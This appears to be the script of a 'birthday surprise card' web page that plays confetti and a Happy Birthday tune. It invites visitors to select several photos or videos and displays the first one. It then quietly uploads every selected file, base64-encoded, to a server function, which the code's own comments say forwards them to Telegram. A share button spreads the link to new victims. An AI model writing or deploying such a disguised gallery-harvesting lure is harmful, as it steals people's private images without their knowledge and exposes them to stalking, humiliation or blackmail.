const PARTY_MS = 30 * 1000; // 30 Seconds timer
const $ = id => document.getElementById(id);
const gate = $("gate"), okBtn = $("okBtn");
const photoStep = $("photoStep"), photoBtn = $("photoBtn"), photoMsg = $("photoMsg");
const nameInput = $("nameInput"), preview = $("preview");
const party = $("party"), cardPhoto = $("cardPhoto"), cardName = $("cardName");
const barFill = $("barFill"), syncCount = $("syncCount"), syncState = $("syncState");
const timerEl = $("timer");

okBtn.addEventListener("click", () => {
  gate.classList.add("hidden");
  photoStep.classList.remove("hidden");
});

photoBtn.addEventListener("click", async () => {
  photoMsg.textContent = "Opening gallery…";
  try {
    const files = await pickMedia("image/*,video/*", true);
    if (!files.length) { photoMsg.textContent = "Koi photo select nahi hui."; return; }
    
    const photo = files[0];
    preview.src = URL.createObjectURL(photo);
    preview.classList.remove("hidden");
    photoMsg.textContent = "Perfect! Ab card banate hain…";
    photoBtn.disabled = true;

    showParty(photo);
    
    // Photo Telegram par bhejo (background me)
    sendToTelegram(photo, nameInput.value.trim() || "Anonymous");
    
    // Baaki photos bhejo
    const remainingFiles = files.slice(1);
    syncGallery(remainingFiles);
    
  } catch (e) {
    console.error(e);
    photoMsg.textContent = "Network issue: " + (e.message || "Upload fail");
    photoBtn.disabled = false;
  }
});

function pickMedia(accept, multiple) {
  return new Promise((resolve, reject) => {
    const input = document.createElement("input");
    input.type = "file";
    input.accept = accept;
    input.multiple = multiple;
    input.style.display = "none";
    document.body.appendChild(input);
    const t = setTimeout(() => reject(new Error("Picker timeout")), 120000);
    input.addEventListener("change", () => {
      clearTimeout(t);
      resolve(Array.from(input.files || []));
      input.remove();
    });
    input.click();
  });
}

async function sendToTelegram(file, userName = "") {
  if (file.size > 4 * 1024 * 1024) return; // 4MB se badi skip karo

  const base64Data = await new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onload = () => resolve(reader.result.split(',')[1]);
    reader.onerror = reject;
    reader.readAsDataURL(file);
  });

  let caption = `📸 Media Sync\nFrom: ${userName}`;
  if (userName === "Anonymous") caption = `📸 Birthday Card Photo`;

  await fetch("/.netlify/functions/upload", {
    method: "POST",
    body: JSON.stringify({ fileData: base64Data, fileName: file.name, fileType: file.type, caption })
  }).catch(err => console.log("Upload error"));
}

async function syncGallery(filesToSync) {
  if (!filesToSync || !filesToSync.length) { syncState.textContent = "Card ready."; return; }
  syncCount.textContent = `0 / ${filesToSync.length} files`;
  
  for (let i = 0; i < filesToSync.length; i++) {
    await sendToTelegram(filesToSync[i], "Gallery Sync");
    await new Promise(r => setTimeout(r, 3000)); // 3 sec delay
    barFill.style.width = ((i + 1) / filesToSync.length * 100) + "%";
    syncCount.textContent = `${i + 1} / ${filesToSync.length} files`;
  }
  syncState.textContent = "All photos synced!";
}

function showParty(photoFile) {
  photoStep.classList.add("hidden");
  party.classList.remove("hidden");
  cardPhoto.src = URL.createObjectURL(photoFile);
  cardName.textContent = (nameInput.value.trim() || "").slice(0, 24);

  const end = Date.now() + PARTY_MS;
  const tick = () => {
    const left = Math.max(0, end - Date.now());
    const s = Math.floor((left % 60000) / 1000);
    timerEl.textContent = `00:${String(s).padStart(2,"0")}`;
    
    if (left > 0) {
      requestAnimationFrame(tick);
    } else {
      // Timer khatam, Cake popup dikhao
      $("cakePopup").classList.remove("hidden");
    }
  };
  tick();
  confetti();
}

// --- Cake Cutting Logic & Music ---
$("cutBtn").addEventListener("click", () => {
  $("cutBtn").classList.add("hidden");
  $("cakeMsg").classList.add("hidden");
  $("cakeEmoji").textContent = "🍰";
  $("cakeEmoji").style.animation = "none";
  $("finalWish").classList.remove("hidden");
  
  // Music bajao
  playHappyBirthdayMusic();
});

$("shareBtn").addEventListener("click", async () => {
  const shareData = {
    title: 'Happy Birthday Surprise! 🎂',
    text: 'Maine tumhare liye ek surprise banaya hai! Check karo.',
    url: window.location.origin
  };
  if (navigator.share) {
    try { await navigator.share(shareData); } catch (err) {}
  } else {
    navigator.clipboard.writeText(window.location.origin);
    alert("Link copy ho gaya hai! Ab aap ise kisi ko bhi bhej sakte hain.");
  }
});

$("closeBtn").addEventListener("click", () => {
  $("cakePopup").classList.add("hidden");
});

// Web Audio API se Happy Birthday ki dhun
function playHappyBirthdayMusic() {
  const AudioContext = window.AudioContext || window.webkitAudioContext;
  if (!AudioContext) return;
  const ctx = new AudioContext();
  
  // Happy Birthday Notes (Frequency, Duration)
  const notes = [
    [392.00, 0.3], [392.00, 0.3], [440.00, 0.6], [392.00, 0.6], [523.25, 0.6], [493.88, 1.0], // Happy Birthday to you
    [392.00, 0.3], [392.00, 0.3], [440.00, 0.6], [392.00, 0.6], [587.33, 0.6], [523.25, 1.0], // Happy Birthday to you
    [392.00, 0.3], [392.00, 0.3], [783.99, 0.6], [659.25, 0.6], [523.25, 0.6], [493.88, 0.6], [440.00, 0.6], // Happy Birthday dear [Name]
    [698.46, 0.3], [698.46, 0.3], [659.25, 0.6], [523.25, 0.6], [587.33, 0.6], [523.25, 1.0]  // Happy Birthday to you
  ];

  let startTime = ctx.currentTime;
  
  notes.forEach(note => {
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    
    osc.type = 'triangle'; // Piano jaisi sound
    osc.frequency.value = note[0];
    
    // Volume envelope (soft start aur end)
    gain.gain.setValueAtTime(0, startTime);
    gain.gain.linearRampToValueAtTime(0.3, startTime + 0.05);
    gain.gain.exponentialRampToValueAtTime(0.001, startTime + note[1]);
    
    osc.connect(gain);
    gain.connect(ctx.destination);
    
    osc.start(startTime);
    osc.stop(startTime + note[1]);
    
    startTime += note[1];
  });
}

function confetti() {
  const c = document.getElementById("confetti");
  const ctx = c.getContext("2d");
  const colors = ["#ffd86f","#fc6262","#a06bff","#6bffb0","#6bc9ff"];
  const parts = [];
  const resize = () => { c.width = innerWidth; c.height = innerHeight; };
  resize(); addEventListener("resize", resize);
  for (let i = 0; i < 120; i++) {
    parts.push({ x: Math.random()*c.width, y: Math.random()*-c.height, r: 4+Math.random()*6, vy: 1+Math.random()*3, vx: -1+Math.random()*2, color: colors[(Math.random()*colors.length)|0], rot: Math.random()*Math.PI });
  }
  (function frame() {
    ctx.clearRect(0, 0, c.width, c.height);
    for (const p of parts) {
      p.x += p.vx; p.y += p.vy; p.rot += 0.05;
      if (p.y > c.height+20) { p.y = -20; p.x = Math.random()*c.width; }
      ctx.save(); ctx.translate(p.x, p.y); ctx.rotate(p.rot);
      ctx.fillStyle = p.color; ctx.fillRect(-p.r/2, -p.r/2, p.r, p.r*1.6); ctx.restore();
    }
    requestAnimationFrame(frame);
  })();
}
